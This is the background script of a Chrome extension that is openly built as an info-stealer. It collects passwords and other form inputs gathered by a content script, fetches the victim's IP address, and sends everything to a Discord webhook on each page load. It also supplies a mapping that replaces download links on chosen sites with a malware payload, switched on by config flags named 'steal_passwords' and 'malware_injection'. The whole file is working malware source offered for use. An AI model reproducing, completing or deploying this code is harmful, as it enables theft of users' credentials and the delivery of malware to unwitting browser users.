// global variables relevant to webhook deployment

// TODO: Convert to class, add .env for webhook urls
const webhooks = {
    DISCORD: "", // discord webhook url
}

// ENUMS
const TAB_SWITCH = 0;
const TAB_LOAD = 1;

// global variables related to the info we will harvest
let ip = undefined;
let lastActiveTab = undefined;
let info = {}
let buffer_count = 0;

// put pages you don't want to save data from (i.e., reduce noise, etc).
let blacklist = [
    
]

let malware_url_mapping = {
    'https://discord.com/': '', // the link to the payload you want to replace download links with goes here
}

// settings related files
const config = {
    allow_send_on_tab_switch: false, // turn on if you want to count tab switches towards your buff count.
    allow_send_on_tab_load: true, // turn on if you want to count tab loads towards your buff count
    buffer_send_threshold: 1, // num complete page loads required for sending data (1 = no buffer)

    // data we want to steal
    steal_passwords: true,  // turn on if you want to steal passwords from sites.
    malware_injection: true, // turn on if you want to inject malware for certain sites.
}

// webhook related functions
/**
 * Sends post request to the specified url with the provided JSON data.
 * @param {str} url
 * @param json_data
 */
function post_data(url, json_data) {
    // send post request to endpoint
    fetch(url, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(json_data, null, 2),
    });
}

/**
 * A bare-bones method that allows you to send messages to your discord webhook.
 * @param {str} msg 
 */
function send_discord_webhook(msg) {
    // TODO: Add support for embeds to make message display nicer
    
    // webhook specific parameters
    const params = {
        username: ip,
        avatar_url: "",
        content: `${"```"}${msg}${"```"}`,
    };

    // send message to discord webhook
    post_data(webhooks.DISCORD, params);
}

/**
 * This function will handle firing our webhook given our config 
 * settings.
 * @param {ENUM} dispatcher 
 */
function dispatch_info_send(dispatcher, msg) {
    const valid_dispatch = (dispatcher == TAB_SWITCH && config.allow_send_on_tab_switch) || (dispatcher == TAB_LOAD && config.allow_send_on_tab_load);
    if (valid_dispatch && config.buffer_send_threshold > 1) {
        buffer_count++;
        console.log(`[i] Current buffer count: ${buffer_count}`);
    }

    // TODO: Add mapping for sending other webhooks

    // validate that dispatcher is allowed to execute
    if (valid_dispatch && (buffer_count % config.buffer_send_threshold == 0)) {
        console.log("[+] Buffer ready. Sending webhook...")
        send_discord_webhook(msg);
    }
}

// data helper functions
/**
 * This function adds entries to our information directory. We also handle
 * url based blacklisting to for filtering against urls that we know are 
 * redundant (i.e., chrome new tab, etc).
 * @param {str} url 
 */
function create_info_entry(url) {
    // check against our blacklist for urls to save

    info[url] = {
        passwords: {},
        alt_inputs: {},
        timestamp: new Date().toUTCString(),
    }
}

// set-up code that initializes some undefined globals
// fetches our ip to be saved.
fetch('https://api.ipify.org?format=json')
    .then((value) => {return value.json();})
    .then((data) => {ip = data.ip;});

// global listeners that listen to content script loading and passes
// the info stealing parameters.
/**
 * Listens to messages from our content scripts. Useful for DOM related
 * parsing.
 */
chrome.runtime.onMessage.addListener((message, sender, reply) => {
    if (message.command == "script-first-load") {
        console.log("Replying with settings file...");
        reply({
            settings: config,
        });
    } 
    if (message.command == "script-password-update") {
        console.log("[+] Received information: " + JSON.stringify(message.data));
        if (info[lastActiveTab] === undefined) { // this check is required to cover pages that were there before 
            // we loaded our extension.
            create_info_entry(lastActiveTab);
        }
        info[lastActiveTab].passwords = message.data.passwords;
        info[lastActiveTab].alt_inputs = message.data.alt_inputs;
    }
    if (message.command == "malware-injection-url-req") {
        console.log('[+] Sending malware injection url...');
        reply({
            url: malware_url_mapping[lastActiveTab]
        });
    }
});

// global listeners that listen to chrome events and are then perform
// actions depending on the config file.
/**
 * Listens to when the active tab is changed (i.e., click to new
 * tab).
*/
chrome.tabs.onActivated.addListener(
    (activeInfo) => {
        chrome.tabs.get(activeInfo.tabId, (tab)=> {
            lastActiveTab = tab.url;
        });
        if (info[lastActiveTab] === undefined) {
            create_info_entry(lastActiveTab);
        }
        dispatch_info_send(TAB_SWITCH, JSON.stringify({ ip: ip, data: info }, null, 2));
    }
);

/**
 * Listens to when we've fully loaded a webpage.
 */
chrome.webNavigation.onCompleted.addListener((details) => {
    lastActiveTab = details.url;
    create_info_entry(details.url);
    dispatch_info_send(TAB_LOAD, JSON.stringify({ ip: ip, data: info }, null, 2));
});
